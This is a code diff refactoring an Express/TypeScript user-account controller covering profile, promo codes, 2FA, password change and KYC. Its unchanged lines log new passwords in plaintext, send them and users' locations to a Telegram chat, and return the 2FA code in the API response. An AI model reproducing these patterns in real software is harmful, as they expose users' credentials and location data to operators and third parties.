@@ -12,7 +12,7 @@ async function saveUserLogs(id: number, email: string, ipAddress: string, city: 
   const userLogs: any = await UserServices.saveUserLogs(id, email, ipAddress, city, countryName, coordinates, currentDate, userAction, userDomain)
   if (userLogs) {
     console.log('result from save logs func is : ', userLogs)
-    return { status: 'logs was recieved.' }
+    return { status: 'logs was received.' }
   }
   return { status: 'logs was rejected' }
 }
@@ -43,7 +43,7 @@ class UserController {
 
   async personalAreaProfile(req: express.Request, res: express.Response, next: express.NextFunction) {
     try {
-      // get accoutn personal info
+      // get account personal info
       interface userData {
         userId: number
         userEmail: string
@@ -72,13 +72,13 @@ class UserController {
       const user: any = await UserServices.personalAreaProfile(transfer_object.userId)
       console.log('found user is: ', user)
 
-      if (!user) return res.status(400).json({ user: 'not found', status: 'rejected' })
+      if (!user) return res.status(400).json({ user: 'not found', message: 'rejected' })
 
-      if (user.hasOwnProperty('withoutLogs') && user.withoutLogs === true) return res.status(200).json({ user: user, status: 'complete' })
+      if (user.hasOwnProperty('withoutLogs') && user.withoutLogs === true) return res.status(200).json({ user: user, message: 'complete' })
 
       await saveUserLogs(transfer_object.userId, transfer_object.userEmail, transfer_object.ipAddress, transfer_object.city, transfer_object.countryName, transfer_object.coordinates, transfer_object.currentDate, `перешел на ${transfer_object.userAction} `, transfer_object.domainName)
       await telegram.sendMessageByUserActions(transfer_object.userEmail, ` перешел на ${transfer_object.userAction}`, transfer_object.domainName)
-      return res.status(200).json({ user: user, status: 'complete' })
+      return res.status(200).json({ user: user, message: 'OK' })
 
     } catch (e) {
       next(e)
@@ -118,7 +118,7 @@ class UserController {
       if (result === false) return res.status(400).json({ message: 'wrong data' })
 
       const rebasePromo: boolean = await auth_services.rebasePromocodeToUsed(transfer_object.promocode, transfer_object.userEmail)
-      if (rebasePromo === false) return res.status(500).json({ message: 'internal server error' })
+      if (!rebasePromo) return res.status(500).json({ message: 'internal server error' })
       await saveUserLogs(transfer_object.userId, transfer_object.userEmail, transfer_object.ipAddress, transfer_object.city, transfer_object.countryName, transfer_object.coordinates, transfer_object.currentDate, ` использовал промокод ${transfer_object.promocode} на `, transfer_object.domainName)
       await telegram.sendMessageByUserActions(transfer_object.userEmail, ` использовал промокод ${transfer_object.promocode} `, transfer_object.domainName)
       return res.status(200).json({ message: 'ok' })
@@ -133,25 +133,14 @@ class UserController {
       const { userId, userName, userEmail, domainName, ipAddress, city, countryName, coordinates, currentDate, userAction } = req.body
       console.log('req body: ', req.body);
 
-      if (!userName && !userId) {
-        return res.json({
-          message: 'wrong data',
-          status: 'rejected'
-        })
-      }
+      if (!userName && !userId) return res.status(400).json({message: 'wrong data' })
       const result: boolean = await UserServices.changeNameInProfile(userId, userName)
-      if (result === false) {
-        return res.json({
-          message: 'error',
-          status: 'rejected'
-        })
-      }
+      if (!result) return res.status(400).json({message: 'can`t find any user'})
+      
       await saveUserLogs(userId, userEmail, ipAddress, city, countryName, coordinates, currentDate, ` поменял имя на ${userName} `, domainName)
       await telegram.sendMessageByUserActions(userEmail, ` поменял имя на ${userName} `, domainName)
-      return res.json({
-        message: 'name was changed',
-        status: 'complete'
-      })
+      return res.status(200).json({message: 'OK'})
+      
     } catch (e) {
       next(e)
     }
@@ -166,6 +155,7 @@ class UserController {
         domainName: string
         userId: number
         userEmail: string
+        currentTime: string
         code: string
       }
 
@@ -178,14 +168,13 @@ class UserController {
         domainName: req.body.domainName,
         userId: req.body.userId,
         userEmail: req.body.userEmail,
+        currentTime: req.body.currentTime,
         code: code
       }
-      const result: boolean = await UserServices.enableTwoStepVerification(transferObject)
-      if (result === false) return res.status(400).json({ message: 'wrong data', status: 'rejected' })
-
-      return res.status(202).json({ message: '2fa was enabled', status: 'complete', userCode: code })
-
-
+      const result: any = await UserServices.enableTwoStepVerification(transferObject)
+      if (!result) return res.status(400).json({ message: 'wrong data'})
+      
+      return res.status(202).json({ message: '2fa was enabled', userCode: code })
     } catch (e) {
       next(e)
     }
@@ -212,13 +201,28 @@ class UserController {
       }
 
       const result: boolean = await UserServices.enableTwoStepVerificationStatus(transferObject)
-      if (result === false) return res.status(400).json({ message: 'wrong data', status: 'rejected' })
+      if (!result) return res.status(400).json({ message: 'wrong data'})
 
-      return res.status(200).json({ message: '2fa turned on', status: 'complete' })
+      return res.status(200).json({ message: '2fa turned on' })
     } catch (e) {
       next(e)
     }
   }
+  
+  async deleteExpiredCode(req: express.Request, res: express.Response, next: express.NextFunction) {
+    try {
+      const code: string =  req.body.code
+      console.log('req body: ', req.body);
+      if (!code ) return res.status(400).json({message: 'rejected'})
+      const result: boolean = await UserServices.deleteExpiredCode(code)
+      if (!result ) return res.status(500).json({message: 'internal server error'})
+     
+      return res.status(200).json({message: 'OK'})
+    } catch (e) {
+      next(e)
+    }
+  }
+  
 
   async disableTwoStepVerificationStatus(req: express.Request, res: express.Response, next: express.NextFunction) {
     try {
@@ -226,22 +230,12 @@ class UserController {
       console.log('req body: ', req.body);
 
       const result: boolean = await UserServices.disableUserTwoStep(userId)
-      if (result === false) {
-        console.log('error');
-        return res.json({
-          message: 'error',
-          status: 'rejected'
-        })
-      }
+      if (!result ) return res.status(400).json({message: 'rejected'})
 
       await saveUserLogs(userId, userEmail, ipAddress, city, countryName, coordinates, currentDate, ` выключил 2фа аутентификацию на`, domainName)
       await telegram.sendMessageByUserActions(userEmail, ` выключил 2фа аутентификацию `, domainName)
-      return res.json({
-        message: '2fa turned off',
-        status: 'complete'
-      })
-
-
+      return res.status(200).json({message: '2fa turned off'})
+      
     } catch (e) {
       next(e)
     }
@@ -249,25 +243,16 @@ class UserController {
 
   async personalAreaSecurityChangePassword(req: express.Request, res: express.Response, next: express.NextFunction) {
     try {
-      // get accoutn security (2fa, login history)
+      // get account security (2fa, login history)
       const { id, newPassword, userEmail, domainName, ipAddress, city, countryName, coordinates, currentDate, userAction } = req.body
       const result: any = await UserServices.personalAreaChangePassword(userEmail, newPassword)
-      if (result === false) {
-        console.log('operation status: ', result)
-        return res.json({
-          message: 'password doesn`t change',
-          status: 'rejected'
-        })
-      }
+      if (!result) return res.status(400).json({ message: 'rejected'})
+      
       await saveUserLogs(id, userEmail, ipAddress, city, countryName, coordinates, currentDate, `поменял пароль на  ${newPassword} на `, domainName)
       await telegram.sendMessageByUserActions(userEmail, `поменял пароль на  ${newPassword}`, domainName)
       console.log('operation status: ', result)
-      return res.json({
-        message: 'password was change',
-        status: 'complete'
-      })
-
-
+      return res.status(200).json({message: 'OK'})
+      
     } catch (e) {
       next(e)
     }
@@ -327,7 +312,7 @@ class UserController {
       const result: boolean = await UserServices.personalAreaSendKyc(transfer_object)
       console.log('operation result is: ', result)
 
-      if (result === false) return res.status(400).json({ message: 'kyc already added' })
+      if (!result) return res.status(400).json({ message: 'kyc already added' })
 
       await saveUserLogs(transfer_object.userId, transfer_object.userEmail, transfer_object.ipAddress, transfer_object.city, transfer_object.countryName, transfer_object.coordinates, transfer_object.currentDate, ' отправил KYC ', transfer_object.domainName)
       await telegram.sendMessageByUserActions(transfer_object.userEmail, ' отправил KYC ', transfer_object.domainName)
